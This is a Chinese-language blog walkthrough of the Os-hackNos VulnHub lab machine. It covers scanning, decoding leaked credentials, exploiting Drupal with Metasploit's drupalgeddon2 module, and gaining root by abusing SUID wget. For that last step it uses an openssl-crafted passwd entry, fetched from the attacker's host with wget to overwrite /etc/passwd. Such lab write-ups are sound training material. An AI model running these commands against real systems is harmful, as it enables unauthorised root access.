---
title: "Os-hackNos-Vulnhub Walkthrough"
categories: [ "安全技术" ]
tags: [ "vulnhub","靶机","walkthrough" ]
draft: false
slug: "509"
date: "2020-02-14 16:01:00"
---

[靶机地址][1]

靶机难度：初等中等之间
flag 数:2

## 工具及漏洞信息

- netdiscover
- nmap
- gobuster
- msf 的 drupal 漏洞利用模块
- SUID 之 wget 提权

## 0x01 信息收集

### 扫描靶机

`netdiscover`的`-r`参数扫描`192.168.1.0/16`结果如下：

![][2]

`nmap`扫描主机及端口信息：

```
nmap -sS -A -n -T4 -p- 192.168.1.11
```

![][3]

`nmap`扫描漏洞信息：

```
nmap --script nmap-vulners -sV 192.168.1.11
```

![][4]

`msf`搜索`cve`漏洞：`search cve:CVE-2019-10082`

没有什么可利用的

### 扫描路径

gobuster 扫描路径：

```
gobuster dir -u http://192.168.1.11 -s 200,301,302 -t 50 -q -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x .php,.txt,.html,.zip
```

![][5]

又看见了我们熟悉的老朋友`drupal`，还有一个奇怪的路径`alexander.txt`，访问得到内容如下：

```
KysrKysgKysrKysgWy0+KysgKysrKysgKysrPF0gPisrKysgKysuLS0gLS0tLS0gLS0uPCsgKytbLT4gKysrPF0gPisrKy4KLS0tLS0gLS0tLjwgKysrWy0gPisrKzwgXT4rKysgKysuPCsgKysrKysgK1stPi0gLS0tLS0gLTxdPi0gLS0tLS0gLS0uPCsKKytbLT4gKysrPF0gPisrKysgKy48KysgKysrWy0gPisrKysgKzxdPi4gKysuKysgKysrKysgKy4tLS0gLS0tLjwgKysrWy0KPisrKzwgXT4rKysgKy48KysgKysrKysgWy0+LS0gLS0tLS0gPF0+LS4gPCsrK1sgLT4tLS0gPF0+LS0gLS4rLi0gLS0tLisKKysuPA==
```

![][6]

`base64`解码后发现是[`Brainfuck code`][7]，[在线解码][8]为`james:Hacker@4514`

尝试使用得到的账号密码通过 SSH 登录靶机，无果

## 0x02 普通用户 getshell

好吧，那就回归我们的老朋友`drupal`，使用之前在`DC:7-Vulnhub Walkthrough`中介绍过的`droopescan`:

```
git clone https://github.com/droope/droopescan
cd droopescan
pip install -r requirements.txt
./droopescan scan drupal -u http://192.168.1.12/drupal -t 32
```

![][9]

扫描出来的是`7.57`版本，而漏洞库是包含这个版本的：

![][10]

启动`msf`，使用效果比较好的模块`exploit/unix/webapp/drupal_drupalgeddon2`:

![][11]

成功获得`meterpreter`会话，进入`shell`后发现又是无回显环境，于是使用`python`获取一个`tty`：

```
python -c 'import pty; pty.spawn("/bin/bash")'
有些没有安装`python2`，所以需要换成
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

![][12]

如果你想使用`clear`清屏，那么只需要给`TERM`这个环境变量赋值`screen`即可

`export TERM=screen`，赋值`xterm`也可以，然后输入`screen`回车即可清屏

## 0x03 提权 root

`Linux`常见提权方法有以下三大类：

- 本地提权
- 数据库提权
- 第三方软件提权

而第三方软件提权我们往往使用`suid`来提权

检查哪些命令具有`suid`权限，`SUID`提权在前面的文章《bossplayersCTF:1-Vulnhub Walkthrough》中介绍过

```
find / -perm -u=s -type f 2>/dev/null
```

- /: 在根目录下查找
- perm: 查找指定权限的文件，/u=s 或者-u=s 参数列出系统中所有`SUID`的档案
- type: 找符合指定的文件类型的文件，-type f: 查找指定目录下所有普通文件
- 2>/dev/null: 2>部分的意思是“重定向文件通道号 2”-映射到标准错误文件通道 stderr，这是程序经常将错误写入其中的位置，/dev/null 是一种特殊字符设备，只允许向其中写入任何内容；阅读时，它不会返回任何内容，因此 2>/dev/null 让 shell 将标准错误从正在运行的程序重定向到/dev/null，从而有效地将其忽略。
- SUID: SUID (Set owner User ID up on execution) 简单来说。suid，它会出现在文件拥有者权限的执行位上，具有这种权限的文件会在其执行时，使调用者暂时获得该文件拥有者的权限。所以我们去找一个文件拥有者为 root，而且其执行位上有 s 的执行文件，那么即使我们用普通用户运行这个文件时，这个文件的执行权限就是 root

![][13]

看到了一个常用的`SUID`提权软件`wget`，`wget`提权的流程简化为下；

- 攻击机使用`opensssl`生成加密密码
- 拼凑一些特殊标志位拼凑成为一条用户`hash`信息写入`passwd`文件
- 在目标机的完整`shell`中使用`wget`下载`passwd`文件并覆盖目标机`/etc/passwd`
- 切换我们手动“创建”的用户，输入我们自己设置的密码，获取`root`权限

具体操作如下：

```
生成密码哈希，后面的密码可以自定义，你记住就行：
openssl passwd -1 -salt salt soapffz
加上拼凑位写入文件：
echo 'soapffz:$1$salt$dyEMWdWzqBIZJWWvteXEg0:0:0::/root/:/bin/bash' >> passwd
```

![][14]

然后在`shell`里下载文件(/etc 文件夹)：

```
wget http://192.168.1.11/passwd -O passwd
su soapffz
```

即可成功提权`root`的`shell`

参考文章：

- [Vulhub 系列：Os-hackNos][15]
- [VulnHub 靶机系列实战教程][16]
- [提权总结以及各种利用姿势][17]

[1]: https://www.vulnhub.com/entry/hacknos-os-hacknos,401/
[2]: https://img.soapffz.com/archives_img/2020/02/14/archives_20200214_161123.png
[3]: https://img.soapffz.com/archives_img/2020/02/14/archives_20200214_161242.png
[4]: https://img.soapffz.com/archives_img/2020/02/14/archives_20200214_161651.png
[5]: https://img.soapffz.com/archives_img/2020/02/14/archives_20200214_164443.png
[6]: https://img.soapffz.com/archives_img/2020/02/14/archives_20200227_141952.png
[7]: https://zh.wikipedia.org/wiki/Brainfuck
[8]: https://www.splitbrain.org/_static/ook/
[9]: https://img.soapffz.com/archives_img/2020/02/14/archives_20200227_143632.png
[10]: https://img.soapffz.com/archives_img/2020/02/14/archives_20200227_143755.png
[11]: https://img.soapffz.com/archives_img/2020/02/14/archives_20200227_144433.png
[12]: https://img.soapffz.com/archives_img/2020/02/14/archives_20200227_144715.png
[13]: https://img.soapffz.com/archives_img/2020/02/14/archives_20200227_145502.png
[14]: https://img.soapffz.com/archives_img/2020/02/14/archives_20200227_155008.png
[15]: https://mp.weixin.qq.com/s/xpM2aUGwDH_beipuvtZQeg
[16]: https://mp.weixin.qq.com/s/skCNWPiEPgJcHXSmsif5qQ
[17]: https://mp.weixin.qq.com/s/9fsn4UT29eXW7SFrTz5L1Q